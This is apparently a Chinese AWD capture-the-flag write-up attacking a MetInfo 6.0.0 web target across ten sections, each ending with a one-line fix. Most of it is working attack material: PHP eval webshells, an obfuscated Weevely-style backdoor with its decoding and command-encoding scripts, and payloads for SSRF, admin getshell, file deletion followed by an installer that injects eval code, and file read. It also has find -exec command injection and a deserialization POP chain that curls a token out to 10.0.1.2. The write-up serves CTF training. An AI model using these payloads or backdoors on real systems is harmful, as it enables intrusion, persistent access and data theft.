

# 1. 网页后门

## 解题步骤
通过D盾找到`/door.php`下发现简单的一句话木马
```php
<?php @eval($_POST['a']);?>
```
## 防护方法
直接删除该文件


# 2. 网页后门


## 解题步骤
通过D盾找到`/admin/tools.php`发现简单的一句话木马
```php
$poc="a#s#s#e#r#t"; 
$poc_1=explode("#",$poc); 
$poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; @$poc_2($_POST['_']);
// assert($_POST['_'])
```

## 防护方法
直接删除该文件即可



# 3. 网页后门


## 解题步骤
D盾扫描出`/config/.control.php`发现混淆后门
另外`member/login.php`与`/index.php`同样也有该后门，利用方式一样

具体分析过程在这
[后门分析文章](http://www.yqxiaojunjie.com/index.php/archives/256/)
[后门分析文章2](http://rcoil.me/2017/09/Weevely%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/)

**利用过程**
```php
/* 1. 得到原始后门*/
function door()
{
    $t = 'pre2Fss(@2Fx(@b2Fase64_deco2F2Fde(preg2F_r2Fepl2Face(array("/_/",2F"2F/-/"),array("/2F","2F+")2';
    $O = 'er"2F;$i=$m[1][02F]2F.$m[1][1];2F$h=$sl2F($s2Fs(md5(2F$i.$kh)2F2F2F,0,3));$2Ff2F=$sl(2F$ss(md5(';
    $s = 'rpos(2F$p,$h)===0)2F{$2Fs[$i]=2F"";$p=2F$ss($p,3)2F2F2F;}if(array2F_key_2Fexists($i,$s))2F{2F$s';
    $U = 'F,$ss($s[2F$i2F],0,2F$e))),$k2F)2F));2F$o2F=ob_get_contents();ob_end_2Fclean(2F);$2Fd=b2Fase64_';
    $l = '2F[$i].=$p;2F$e=strpos($s2F[2F$i2F],$f);if($e2F2F){$k=2F2F$kh.$kf;ob_start();@ev2Fal(@gzu2Fncom';
    $A = str_replace('Th', '', 'ThcreThThaThte_funThThction');
    $N = 'm2F);if($2Fq&&$m){@ses2Fsion_2Fstar2Ft();$s=&2F$_S2FESSION;$ss2F2F="substr";$sl2F="strt2F2Folow';
    $q = '"2F";for($i=0;$i<$2Fl;)2F{2Ffor($j=0;($j<$2Fc&&$i<$l2F);$j+2F+,2F$i++)2F{$o.=$t{$i}^2F$k{$j2F};';
    $K = '=array_value2Fs2F($q);preg2F_2Fma2Ftch_a2Fll("/([\\w])[\\w-2F]+2F(?:2F;q=0.([\\d]))?,?/",$2Fra2F,$';
    $F = '_LANGUAGE2F"];if($rr&&2F$r2F2Fa){$u=par2Fse2F_u2Frl($rr);parse2F_str($2Fu2F["query"],$q2F)2F;$q';
    $c = '2F}}return $2Fo;2F}$r=$_2FSE2FRVE2FR;$rr=@2F$r["2FHT2FTP_2FREFERER"];$ra=@$r[2F"HTTP_ACCE2F2FPT';
    $d = '$i.2F$kf)2F,0,3));$p="";for($z=2F1;$z<coun2Ft2F($m[1]);$z+2F+)2F$p.=$q[$m2F[2]2F[$2Fz]2F];if(st';
    $X = '$kh="abcd"2F;$kf="2Feylg";f2Funct2Fion x($2Ft,$2Fk){$c=st2Fr2Fl2Fen($k);$l=strlen2F($t2F);$o=2F';
    $m = 'e2Fncode(x(gzc2Fomp2Fr2Fess($o),2F$k))2F;print("<2F$k>2F$d</$k2F>");@se2Fss2Fion_destroy();}}}}';
    $E = str_replace('2F', '', $X . $q . $c . $F . $K . $N . $O . $d . $s . $l . $t . $U . $m);
    echo $E;
    $I = $A('', $E);
    print_r($I);
    $I();
}
door();



/* 2. 在本地进行调试分析，将代码尽量可视化，最后得到代码为  */
function doors()
{
    $kh = "abcd";
    $kf = "eylg";
    function x($t, $k)
    {
        $c = strlen($k);
        $l = strlen($t);
        $o = "";
        for ($i = 0; $i < $l;) {
            for ($j = 0; ($j < $c && $i < $l); $j++, $i++) {
                $o .= $t{$i} ^ $k{$j};
            }
        }
        return $o;
    }
    $r = $_SERVER;
    $rr = @$r["HTTP_REFERER"];
    $ra = @$r["HTTP_ACCEPT_LANGUAGE"];
    if ($rr && $ra) {
        $u = parse_url($rr);
        parse_str($u["query"], $q);
        $q = array_values($q);
        preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $ra, $m);
        if ($q && $m) {
            @session_start();
            $s = &$_SESSION;
            $ss = "substr";
            $sl = "strtolower";
            $i = $m[1][0] . $m[1][1];
            $h = $sl($ss(md5($i . $kh), 0, 3));
            $f = $sl($ss(md5($i . $kf), 0, 3));
            $p = "";for ($z = 1; $z < count($m[1]); $z++) {
                $p .= $q[$m[2][$z]];
            }
            if (strpos($p, $h) === 0) {
                $s[$i] = "";
                $p = $ss($p, 3);
            }
            if (array_key_exists($i, $s)) {
                $s[$i] .= $p;
                $e = strpos($s[$i], $f);
                if ($e) {
                    $k = $kh . $kf;
                    ob_start();
                    @eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), $ss($s[$i], 0, $e))), $k)));
                    $o = ob_get_contents();
                    ob_end_clean();
                    $d = base64_encode(x(gzcompress($o), $k));
                    print("<$k>$d</$k>");
                    @session_destroy();
                }
            }
        }
    }
}
// doors();


/* 3. 分析过程中我们得到了payload为在请求报文中用以下字段*/
Accept-Language: ah;q=0.8,an-US;q=0.1,an;q=0.2,an;q=0.3,
Referer: http://114.114.114.114/?q0=hahaha&q1=5af&q2=Gf5IyklXJaq0MqxNM67YYWFAiWA6&q3=92d

// 注意：其中q2的值是通过算法去计算得到的，也是最后执行的命令

/* 4. 通过算法生成q2的值，以下是q2值生成算法 */
function x($t, $k="abcdeylg") {
	$c = strlen($k);
	$l = strlen($t);
	$o = "";
	for ($i = 0;$i < $l;) {
		for ($j = 0;($j < $c && $i < $l);$j++, $i++) {
			$o.= $t{$i} ^ $k{$j};
		}
	}
	return $o;
}

echo preg_replace(array("/_/", "/-/"), array("/", "+"), base64_encode(x(gzcompress("system('ls');"))));

/* 5. 构建最终的payload提交到后门出得到加密后的结果*/
Accept-Language: ah;q=0.8,an-US;q=0.1,an;q=0.2,an;q=0.3,
Referer: http://114.114.114.114/?q0=hahaha&q1=5af&q2=Gf5IyklXJaq0MqxNM67YYWFAiWA6&q3=92d

// 加密结果
<abcdeylg>Gf4uryR37FdpJrIZarr5a8TCJ8DoCZMPC7DbGPxGuDoVZRbmFPUu9DrJHGFvNlsrzXrfFpAxWGSKFvXvNiSWfb60G7i6jG28fkRv</abcdeylg>


/* 6. 通过解密算法解密拿到的密文*/
$data = $_POST['c'];
function x($t, $k="abcdeylg") {
	$c = strlen($k);
	$l = strlen($t);
	$o = "";
	for ($i = 0;$i < $l;) {
		for ($j = 0;($j < $c && $i < $l);$j++, $i++) {
			$o.= $t{$i} ^ $k{$j};
		}
	}
	return $o;
}

echo gzuncompress(x(base64_decode($data)));


/* 7. 最后得到结果*/
config.inc.php	config_safe.php   install.lock	   tablepre.php
config_db.php	database.inc.php  metinfo.inc.php

```


## 防护方法
删除后门文件即可


# 4. SSRF漏洞
通过D盾直接发现的
`/include/curl.php`
```php
if(isset($_GET['address'])){
    $address = $_GET['address'];
    if(filter_var($address,FILTER_VALIDATE_URL)){
        $filter_url = parse_url($address);
        if(preg_match('/127.0.0.1/',$filter_url['host'])){
            system('curl -v -s '.$filter_url['host']);
        }
    }
}
```
[SSRF](https://www.anquanke.com/post/id/101058)
需要Bypass SSRF

后分析发现SSRF漏洞的确存在，但无法获取利用flag，原因是因为获取flag需要带参数，但是参数会被parse_url函数进行分割
例如传入参数为`?address=0://10.0.1.2:80?token=WNHOMGGL;127.0.0.1:80/`
分割后为
`Array ( [scheme] => 0 [host] => 10.0.1.2 [port] => 80 [query] => token=WNHOMGGL;127.0.0.1:80/ ) string(19) "curl -v -s 10.0.1.2" `
导致最后执行的语句为
`string(19) "curl -v -s 10.0.1.2" `

但是在phpstudy中的7.1以下版本都能试下，靶机中php版本位5.5.9却不能成功，其中的可能与一些默认配置相关，还需要在探究。



## 防护方法
删除文件即可


# 5. CMS漏洞-后台getshell，任意文件写入
ivear metinfo CMS  

CMS通常会有许多安全研究员挖掘漏洞，所以我们需要拿到版本号去搜寻，拿现成漏洞
网站最下方拿到`Powered by  MetInfo  6.0.0 `

[metinfo 6.0.0漏洞](https://www.anquanke.com/post/id/154149#h2-3)
分析得到这个CMS存在很多现有的漏洞，我们可以直接去利用


## 解题步骤
通过以下思路得到后台口令
1. 暴力破解 
2. 从数据库中得到密码

暴力破解得到弱口令`admin/admin123`


最后以下为进入后台后的payload
`admin/column/save.php?name=123&action=editor&foldername=upload&module=22;phpinfo();/*`
`http://101.71.29.6:10017/upload/`



## 防护方法
修改后台密码
上过滤补丁，在漏洞没有过滤的地方加上过滤，将常见的危险代码过滤





# 6. 后台任意文件删除+安装getshell漏洞

## 解题步骤
进入后台，执行以下poc，删除掉安装文件
`http://101.71.29.6:10017/admin/app/batch/csvup.php?fileField=test-1&flienamecsv=../../../config/install.lock`

删除成功后，访问根目录，发现需要重新安装
在重新安装的时候，我们在数据库名中输入`met#*/@eval($GET[1]);/*`

在过程中无需理会出现数据库安装出现报错的原因，
因为只需要将写入的代码拼接到文件中即可

，然后安装成功后，在`/config/config_db.php`中可以使用该后门






## 防护方法
把后台口令修改掉
上过滤补丁，在漏洞没有过滤的地方加上过滤，将常见的危险代码过滤


# 7. 任意命令执行
通过分析，我们得到该CMS是比较完善的，除了本身在配置上存在的问题需要进行检查之外，比较难挖掘出CMS本身的漏洞，所以如果继续挖掘，建议
通过seay去找到具有危险性的代码，去分析这些先



## 解题步骤

我们通过seay得到`/admin/admin/getpassword.php`中存在危险函数，具体分析之后发现是业务逻辑代码，直接分析发现进入该业务逻辑条件十分容易满足

```php
case 'debug':
    $file = addslashes($_POST['file']);
    system("find /tmp -iname ".escapeshellcmd($file));
    break;
```

最后构建payload如下，达到任意执行命令的目的

`action=debug&file=sth -or -exec cat /etc/passwd ; -quit`
获得flag
`action=debug&file=sth -or -exec curl http://10.0.1.2?token=WNHOMGGL  ; -quit`

## 防护方法
删除debug代码即可



# 8. 任意文件读取

## 解题步骤
该任意文件读取具体分析看文章
[Metinfo 6.0.0 任意文件读取漏洞](https://badcode.cc/2018/05/26/Metinfo-6-0-0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/)


`http://101.71.29.6:10025/include/thumb.php?dir=...././/http...././/...././/...././/...././/...././/etc/passwd`

但是在AWD模式下比较鸡肋


## 防护方法
上过滤代码
指定目录


# 9. 反序列化漏洞造成任意命令执行

序列化 存档    
什么是反序列化  读档  

什么是反序列化漏洞
[WEB漏洞文章集合](https://chybeta.github.io/2017/08/19/Web-Security-Learning/)

 
## 解题步骤

我们分析存在php反序列化漏洞，`/include/ping.php`
```php
class getip{
    public $ip;
    
    function __construct(){
        $this->ip = "127.0.0.1";
    }
    
    function __destruct(){
        echo 'The ip is'.$this->ip;
    }
}
        
class getresult{
    public $obj;
    public $ip;
    
    function __construct(){
        $this->ip = '127.0.0.1';
        $this->obj = null;
    }
    function __toString(){
        $this->obj->execute();
        return $this->ip;
    }
}

class ping{
    private $ip;
    
    function execute(){
        $str = 'ping '.$this->ip;
        system($str);
    }
}
    
```
分析后构建序列化的pop链
以下为构建的代码
```php
<?php  
	class getip{
		public $ip;
		
		function __construct(){
			$this->ip = "127.0.0.1";
		}
		
		function __destruct(){
			echo 'The ip is'.$this->ip;
		}
	}
		 
	class getresult{
		public $obj;
		public $ip;
		
		function __construct(){
			$this->ip = '127.0.0.1';
			$this->obj = null;
		}
		function __toString(){
			$this->obj->execute();
			return $this->ip;
		}
	}
 
	class ping{
		private $ip="1 | curl http://10.0.1.2?token=WNHOMGGL";
		
		function execute(){
			$str = 'ping '.$this->ip;
			system($str);
		}
    }
    
    $getIp = new getip();
    $getResult = new getresult();
	$ping = new ping();
	
    $getIp -> ip = $getResult;
    $getResult -> obj = $ping;
    $result =  serialize($getIp);
    echo $result.'<br>';
    $result = base64_encode($result);
    echo $result.'<br>';
```


然后我们将构建好的base64编码值放入到ip参数中，最后获取flag值
`http://101.71.29.6:10025/include/ping.php?ip=Tzo1OiJnZXRpcCI6MTp7czoyOiJpcCI7Tzo5OiJnZXRyZXN1bHQiOjI6e3M6Mzoib2JqIjtPOjQ6InBpbmciOjE6e3M6ODoiAHBpbmcAaXAiO3M6Mzk6IjEgfCBjdXJsIGh0dHA6Ly8xMC4wLjEuMj90b2tlbj1XTkhPTUdHTCI7fXM6MjoiaXAiO3M6OToiMTI3LjAuMC4xIjt9fQ==`



## 防护方法
删除该文件即可


# 10. 后台任意文件删除漏洞

## 解题步骤
`/admin/system/uploadfile.php`
```php
if($action=='deletefolder'){
	$filedir="../../".$filename;
    unlink($filedir);
    metsave($rurls);
}
```
最后构建payload如下，可以删除安装锁文件
`http://101.71.29.6:10025/admin/system/uploadfile.php?action=deletefolder&filename=config/install.lock`
在利用安装的getshell漏洞进行写入shell

## 防护方法
删代码
上过滤脚本 ` / php .`